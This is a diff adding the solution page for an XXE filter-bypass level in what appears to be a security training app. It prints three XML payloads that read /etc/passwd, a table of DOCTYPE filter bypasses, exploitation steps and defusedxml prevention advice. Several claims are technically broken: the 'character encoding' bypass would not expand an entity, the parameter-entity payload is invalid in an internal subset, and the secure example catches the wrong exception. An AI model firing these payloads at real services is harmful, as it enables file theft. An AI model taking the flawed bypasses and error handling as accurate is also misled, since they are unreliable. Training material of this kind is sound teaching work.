@@ -1,0 +1,155 @@
+{% extends 'base.html' %}
+
+{% block title %}Solution: XXE Level 2{% endblock %}
+
+{% block content %}
+<div class="row">
+    <div class="col-md-8 offset-md-2">
+        <div class="card">
+            <div class="card-header">
+                <h2 class="text-center"><i class="bi bi-check-circle-fill text-success me-2"></i>Solution: Level 2 - XXE with DOCTYPE Restrictions</h2>
+            </div>
+            <div class="card-body solution-content">
+                <h3>Vulnerability Explanation</h3>
+                <p>
+                    This level implements basic DOCTYPE filtering that attempts to block XXE attacks by restricting DOCTYPE declarations.
+                    However, the filtering can be bypassed using various techniques including entity references and character encoding.
+                </p>
+                <p>
+                    The vulnerability exists because:
+                </p>
+                <ul>
+                    <li>The DOCTYPE filter is not comprehensive enough</li>
+                    <li>Entity references can bypass simple string matching</li>
+                    <li>Character encoding can be used to obfuscate payloads</li>
+                    <li>The parser still processes external entities despite basic filtering</li>
+                </ul>
+                
+                <h3>Solution</h3>
+                <p>To bypass the DOCTYPE restrictions, you can use entity references or character encoding techniques:</p>
+                
+                <div class="alert alert-secondary">
+                    <h5><i class="bi bi-terminal me-2"></i>Bypass Payload Method 1: Entity Reference</h5>
+                </div>
+                <pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE document [
+    &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
+]&gt;
+&lt;document&gt;
+    &lt;title&gt;DOCTYPE Bypass&lt;/title&gt;
+    &lt;content&gt;&amp;xxe;&lt;/content&gt;
+&lt;/document&gt;</code></pre>
+                
+                <div class="alert alert-secondary">
+                    <h5><i class="bi bi-terminal me-2"></i>Bypass Payload Method 2: Character Encoding</h5>
+                </div>
+                <pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE document [
+    &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
+]&gt;
+&lt;document&gt;
+    &lt;title&gt;Encoded Bypass&lt;/title&gt;
+    &lt;content&gt;&amp;#x78;&amp;#x78;&amp;#x65;;&lt;/content&gt;
+&lt;/document&gt;</code></pre>
+                
+                <div class="alert alert-secondary">
+                    <h5><i class="bi bi-terminal me-2"></i>Bypass Payload Method 3: Parameter Entities</h5>
+                </div>
+                <pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE document [
+    &lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;
+    &lt;!ENTITY % eval "&lt;!ENTITY xxe '%file;'&gt;"&gt;
+    %eval;
+]&gt;
+&lt;document&gt;
+    &lt;title&gt;Parameter Entity Bypass&lt;/title&gt;
+    &lt;content&gt;&amp;xxe;&lt;/content&gt;
+&lt;/document&gt;</code></pre>
+                
+                <h4>Step-by-Step Exploitation:</h4>
+                <ol>
+                    <li><strong>Analyze Filtering:</strong> Understand what DOCTYPE patterns are being blocked</li>
+                    <li><strong>Choose Bypass Method:</strong> Select an appropriate bypass technique</li>
+                    <li><strong>Craft Payload:</strong> Create XML that evades the filter while maintaining XXE functionality</li>
+                    <li><strong>Test Payload:</strong> Submit the crafted XML to verify bypass success</li>
+                    <li><strong>Extract Data:</strong> Retrieve the target file contents through the XXE vulnerability</li>
+                </ol>
+                
+                <h3>Common DOCTYPE Filter Bypasses</h3>
+                <div class="table-responsive">
+                    <table class="table table-striped">
+                        <thead>
+                            <tr>
+                                <th>Filter Type</th>
+                                <th>Bypass Technique</th>
+                                <th>Example</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td>Case Sensitivity</td>
+                                <td>Mixed case</td>
+                                <td>&lt;!doctype&gt;, &lt;!DocType&gt;</td>
+                            </tr>
+                            <tr>
+                                <td>Whitespace Filtering</td>
+                                <td>Tab/newline characters</td>
+                                <td>&lt;!DOCTYPE\t&gt;, &lt;!DOCTYPE\n&gt;</td>
+                            </tr>
+                            <tr>
+                                <td>Entity Name Blocking</td>
+                                <td>Character references</td>
+                                <td>&amp;#x78;&amp;#x78;&amp;#x65; for "xxe"</td>
+                            </tr>
+                            <tr>
+                                <td>SYSTEM Keyword Block</td>
+                                <td>Parameter entities</td>
+                                <td>Use %entities; to define SYSTEM</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+                
+                <h3>Real-world Impact</h3>
+                <p>
+                    DOCTYPE filtering bypass techniques are commonly used in real attacks because:
+                </p>
+                <ul>
+                    <li>Many applications implement insufficient input validation</li>
+                    <li>Blacklist-based filtering is prone to bypasses</li>
+                    <li>Developers often underestimate the complexity of secure XML parsing</li>
+                    <li>Legacy applications may use outdated XML parsing libraries</li>
+                </ul>
+                
+                <h3>Prevention</h3>
+                <p>Instead of relying on DOCTYPE filtering, implement comprehensive XXE prevention:</p>
+                <ul>
+                    <li><strong>Disable External Entities:</strong> Configure XML parsers to reject external entity processing entirely</li>
+                    <li><strong>Use Secure Libraries:</strong> Implement libraries like defusedxml that are designed to prevent XXE</li>
+                    <li><strong>Whitelist Approach:</strong> Only allow specific, expected XML structures</li>
+                    <li><strong>Input Validation:</strong> Validate XML against strict schemas</li>
+                    <li><strong>Sandboxing:</strong> Process XML in isolated environments with limited file system access</li>
+                </ul>
+                
+                <h4>Secure Implementation Example:</h4>
+                <pre><code>from defusedxml import ElementTree as ET
+from defusedxml.ElementTree import ParseError
+
+def secure_xml_parse(xml_content):
+    try:
+        # defusedxml automatically prevents XXE attacks
+        root = ET.fromstring(xml_content)
+        return root
+    except ParseError as e:
+        # Handle parsing errors securely
+        return None</code></pre>
+                
+                <div class="mt-4">
+                    <a href="{{ url_for('xxe_level2') }}" class="btn btn-outline-primary">Back to Challenge</a>
+                    <a href="{{ url_for('vulnerabilities') }}" class="btn btn-outline-secondary float-end">All Challenges</a>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
